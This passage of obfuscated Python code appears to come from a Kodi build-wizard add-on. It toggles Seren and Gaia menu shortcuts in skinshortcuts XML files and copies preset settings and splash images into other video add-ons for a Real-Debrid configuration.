      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:565
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:583
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:586
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:587
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:589
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:590
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:591
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:609
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:612
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:613
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:615
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:616
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:617
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:635
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:638
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:639
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:642
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:643
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:644
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:662
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:665
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:666
def rdbuildinstall ():#line:669
  try :#line:670
   OO0O0OO00OOOO000O =(ADDON .getSetting ("rdbuild"))#line:671
   if OO0O0OO00OOOO000O =='true':#line:672
     O0OO000OO0OOO0O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:673
     OO0OO00O0O000OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:674
     copyfile (O0OO000OO0OOO0O00 ,OO0OO00O0O000OOO0 )#line:675
  except :#line:676
     pass #line:677
def rdbuildaddonoff ():#line:680
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:683
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:684
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:685
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:703
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:706
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:707
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:711
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:712
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:713
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:731
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:734
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:735
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:739
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:740
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:741
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:759
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:762
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:763
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:767
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:768
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:769
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:787
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:790
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:791
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:794
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:795
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:796
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:814
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:817
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:818
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:820
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:821
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:822
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:840
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:843
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:844
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:846
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:847
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:848
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:866
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:869
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:870
    O0O0O0OO000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:873
    with open (O0O0O0OO000OOOOO0 ,'r')as OOO0O0OO000OO00O0 :#line:874
      OOOOOO0O00O0O00O0 =OOO0O0OO000OO00O0 .read ()#line:875
    OOOOOO0O00O0O00O0 =OOOOOO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:893
    with open (O0O0O0OO000OOOOO0 ,'w')as OOO0O0OO000OO00O0 :#line:896
      OOO0O0OO000OO00O0 .write (OOOOOO0O00O0O00O0 )#line:897
def rdbuildinstalloff ():#line:900
    try :#line:901
       O00O0O0OO0OOO0O0O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:902
       O00O0O000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:903
       copyfile (O00O0O0OO0OOO0O0O ,O00O0O000OOOO00OO )#line:905
       O00O0O0OO0OOO0O0O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:907
       O00O0O000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:908
       copyfile (O00O0O0OO0OOO0O0O ,O00O0O000OOOO00OO )#line:910
       O00O0O0OO0OOO0O0O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:912
       O00O0O000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:913
       copyfile (O00O0O0OO0OOO0O0O ,O00O0O000OOOO00OO )#line:915
       O00O0O0OO0OOO0O0O =ADDONPATH +"/resources/rdoff/Splash.png"#line:918
       O00O0O000OOOO00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:919
       copyfile (O00O0O0OO0OOO0O0O ,O00O0O000OOOO00OO )#line:921
    except :#line:923
       pass #line:924
def rdbuildaddonON ():#line:931
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:933
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:934
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:935
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:953
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:956
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:957
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:961
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:962
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:963
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:981
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:984
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:985
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:989
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:990
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:991
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1009
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1012
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1013
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1017
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:1018
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:1019
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1037
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1040
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1041
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1044
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:1045
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:1046
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1064
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1067
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1068
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1070
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:1071
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:1072
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1090
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1093
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1094
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1096
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:1097
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:1098
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1116
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1119
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1120
    OOO00O0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1123
    with open (OOO00O0O0O0O00000 ,'r')as OOO0O0O0O0O0O0000 :#line:1124
      O0O000O0O0OOO00OO =OOO0O0O0O0O0O0000 .read ()#line:1125
    O0O000O0O0OOO00OO =O0O000O0O0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1143
    with open (OOO00O0O0O0O00000 ,'w')as OOO0O0O0O0O0O0000 :#line:1146
      OOO0O0O0O0O0O0000 .write (O0O000O0O0OOO00OO )#line:1147
def rdbuildinstallON ():#line:1150
    try :#line:1152
       O00OO000000O0000O =ADDONPATH +"/resources/rd/victory.xml"#line:1153
       O00OO0O00O0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (O00OO000000O0000O ,O00OO0O00O0OO0OO0 )#line:1156
       O00OO000000O0000O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1158
       O00OO0O00O0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (O00OO000000O0000O ,O00OO0O00O0OO0OO0 )#line:1161
       O00OO000000O0000O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1163
       O00OO0O00O0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
       copyfile (O00OO000000O0000O ,O00OO0O00O0OO0OO0 )#line:1166
       O00OO000000O0000O =ADDONPATH +"/resources/rd/Splash.png"#line:1169
       O00OO0O00O0OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
       copyfile (O00OO000000O0000O ,O00OO0O00O0OO0OO0 )#line:1172
    except :#line:1174
       pass #line:1175
def rdbuild ():#line:1185
	OO00O0O00O0O0OOO0 =(ADDON .getSetting ("rdbuild"))#line:1186
	if OO00O0O00O0O0OOO0 =='true':#line:1187
		OOO0000OO000OO0O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1188
		OOO0000OO000OO0O0 .setSetting ('all_t','0')#line:1189
		OOO0000OO000OO0O0 .setSetting ('rd_menu_enable','false')#line:1190
		OOO0000OO000OO0O0 .setSetting ('magnet_bay','false')#line:1191
		OOO0000OO000OO0O0 .setSetting ('magnet_extra','false')#line:1192
		OOO0000OO000OO0O0 .setSetting ('rd_only','false')#line:1193
		OOO0000OO000OO0O0 .setSetting ('ftp','false')#line:1195
		OOO0000OO000OO0O0 .setSetting ('fp','false')#line:1196
		OOO0000OO000OO0O0 .setSetting ('filter_fp','false')#line:1197
		OOO0000OO000OO0O0 .setSetting ('fp_size_en','false')#line:1198
		OOO0000OO000OO0O0 .setSetting ('afdah','false')#line:1199
		OOO0000OO000OO0O0 .setSetting ('ap2s','false')#line:1200
		OOO0000OO000OO0O0 .setSetting ('cin','false')#line:1201
		OOO0000OO000OO0O0 .setSetting ('clv','false')#line:1202
		OOO0000OO000OO0O0 .setSetting ('cmv','false')#line:1203
		OOO0000OO000OO0O0 .setSetting ('dl20','false')#line:1204
		OOO0000OO000OO0O0 .setSetting ('esc','false')#line:1205
		OOO0000OO000OO0O0 .setSetting ('extra','false')#line:1206
		OOO0000OO000OO0O0 .setSetting ('film','false')#line:1207
		OOO0000OO000OO0O0 .setSetting ('fre','false')#line:1208
		OOO0000OO000OO0O0 .setSetting ('fxy','false')#line:1209
